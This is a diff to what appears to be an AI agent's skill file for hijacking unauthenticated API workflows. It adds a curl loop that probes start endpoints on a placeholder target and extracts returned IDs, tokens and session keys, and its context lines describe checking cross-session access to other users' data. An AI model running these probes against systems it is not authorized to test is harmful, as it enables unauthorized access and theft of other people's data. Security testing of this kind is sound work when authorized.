@@ -6,13 +6,14 @@ revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
 compatibility: Requires curl, python3
-tags: [recon, API, unauthenticated, flow, interview, form, upload, export]
-category: recon
-related_skills:
-  - api-noauth-hunt
-  - hardcoded-credential-hunt
-  - hunt-write-gap
-  - hunt-idor
+metadata:
+  tags: [recon, API, unauthenticated, flow, interview, form, upload, export]
+  category: recon
+  related_skills:
+    - api-noauth-hunt
+    - hardcoded-credential-hunt
+    - hunt-write-gap
+    - hunt-idor
 ---
 
 # Unauthenticated API Flow Hijack
@@ -32,6 +33,32 @@ Exploit API endpoints that implement a full business workflow (interview, applic
 - `terminal` with curl and python3.
 - Discovery of at least one API endpoint that accepts POST without authentication.
 - The endpoint returns an identifier (session ID, interview ID, token) that can be passed to subsequent steps.
+
+## How to Run
+
+```bash
+# Probe common flow-starting endpoints
+for ep in /start /api/start /api/v1/start /begin /init /api/init \
+          /start-interview /api/interview/start /api/session/start; do
+  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /tmp/resp.json -w "%{http_code}" \
+    -X POST "https://target.com$ep" \
+    -H "Content-Type: application/json" -d '{}')
+  if [ "$code" = "200" ] || [ "$code" = "201" ]; then
+    echo "=== $ep ($code) ==="
+    cat /tmp/resp.json | python3 -m json.tool 2>/dev/null | head -20
+    # Extract any returned ID
+    cat /tmp/resp.json | python3 -c "
+import sys,json,re
+try:
+    d=json.load(sys.stdin)
+    for k in d:
+        if any(x in k.lower() for x in ['id','token','session','key']):
+            print(f'{k}: {d[k]}')
+except: pass
+"
+  fi
+done
+```
 
 ## Quick Detection
 
@@ -85,14 +112,14 @@ for step in range(1, 20):
         "answer": "test response",
         "data": {"key": "value"}
     })
-    
+
     resp = r.json()
     print(f"Step {step}: {resp.get('currentStep', '?')} — {resp.get('message', '')[:80]}")
-    
+
     # Check for completion or blocked paths
     if resp.get("complete") or resp.get("error"):
         break
-    
+
     # Extract any requirements from the message
     if "required" in str(resp).lower() or "invalid" in str(resp).lower():
         print(f"  Validation: {json.dumps(resp)[:200]}")
@@ -178,10 +205,12 @@ for url in re.findall(r'https?://[^\s\"<>]+\.(?:supabase\.co|amazonaws\.com|stor
 4. Verify export produces real data (check file size and content).
 5. If session IDs are enumerable, confirm cross-session access (access another session's data).
 
+---
+
 ## Related Skills
 
 - **`api-noauth-hunt`** — Detecting API endpoints that lack authentication.
 - **`hardcoded-credential-hunt`** — Finding passwords that unlock privileged steps within the flow.
 - **`hunt-write-gap`** — POST/PUT endpoints that accept writes without requiring read authentication.
 - **`hunt-idor`** — Exploiting insecure direct object references within flow session IDs.
-- **`firebase-supabase-attack`** — If uploads go to Supabase/Firebase storage.
+- **`hunt-firebase`** / **`hunt-supabase`** — If uploads go to Firebase/Supabase storage.
